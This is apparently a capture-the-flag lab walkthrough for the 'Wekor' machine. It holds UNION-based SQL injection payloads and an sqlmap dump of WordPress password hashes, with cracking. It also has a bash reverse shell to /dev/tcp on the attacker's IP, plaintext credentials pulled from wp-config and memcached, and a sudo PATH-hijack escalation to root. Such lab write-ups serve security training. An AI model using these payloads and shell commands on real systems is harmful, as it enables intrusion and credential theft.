# Wekor 

> VOiD | Wednesday 03 November 2021 06:01:45 PM IST

My IP : 10.8.253.221
Target IP : 



## PORT 80 [http]

http://wekor.thm/robots.txt
```bash
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

POST /it-next/it_cart.php HTTP/1.1
```bash


coupon_code=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="wordpress"--+&apply_coupon=Apply+Coupon

wp_commentmeta,wp_comments,wp_links,wp_options,wp_postmeta,wp_posts,wp_term_relationships,wp_term_taxonomy,wp_termmeta,wp_terms,wp_usermeta,wp_users

coupon_code=' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema="wordpress" and table_name="wp_users"--+&apply_coupon=Apply+Coupon

1 With ID : ID,user_login,user_pass,user_nicename,user_email,user_url,user_registered,user_activation_key,user_status,display_name And With Expire Date Of : 3 Is Valid!

coupon_code=' union select group_concat(id),group_concat(user_login),group_concat(user_pass) from wp_users --+&apply_coupon=Apply+Coupon
```



```bash
sqlmap -r req --batch -D wordpress -T wp_users --dbms mysql -C id,user_login,user_pass --dump

[4 entries]
+------+------------+------------------------------------+
| id   | user_login | user_pass                          |
+------+------------+------------------------------------+
| 1    | admin      | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. |
| 5743 | wp_jeffrey | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 |
| 5773 | wp_yura    | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ |
| 5873 | wp_eagle   | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ |
+------+------------+------------------------------------+

john hash --wordlist=/usr/share/wordlists/rockyou.txt
?:rockyou
?:soccer13
?:xxxxxx
```




wordpress creds
wp_yura:soccer13


exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.253.221/4444 0>&1'")

```bash
-rw-rw-rw- 1 www-data www-data 3192 Jan 21  2021 /var/www/html/site.wekor.thm/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'root123@#59' );
define( 'DB_HOST', 'localhost' );


www-data@osboxes:/tmp$ nc localhost 11211


www-data@osboxes:/$ telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
get username
VALUE username 0 4
Orka
END
get password
VALUE password 0 15
OrkAiSC00L24/7$
END


Orka@osboxes:~$ cat user.txt 
1a26a6d51c0172400add0e297608dec6

```

```py
Orka@osboxes:~/Desktop$ cat transfer.py 
import time
import socket
import sys
import os

result = sys.argv[1]

print "Saving " + result + " BitCoin(s) For Later Use "

test = raw_input("Do you want to make a transfer? Y/N : ")

if test == "Y":
	try:
		print "Transfering " + result + " BitCoin(s) "
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		connect = s.connect(("127.0.0.1",3010))
		s.send("Transfer : " + result + "To https://transfer.bitcoins.com")
		time.sleep(2.5)
		print ("Transfer Completed Successfully...")
		time.sleep(1)
		s.close()
	except:
		print("Error!")
else:
	print("Quitting...")
	time.sleep(1)
```


```bash
User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
root@osboxes:/root# cat /usr/sbin/python 
#!/bin/bash

/bin/bash -p


root@osboxes:/root# cat root.txt 
f4e788f87cc3afaecbaf0f0fe9ae6ad7
root@osboxes:/root# cat wordpress_admin.txt 
admin:krq7@Gr60jo5FOHyDL

```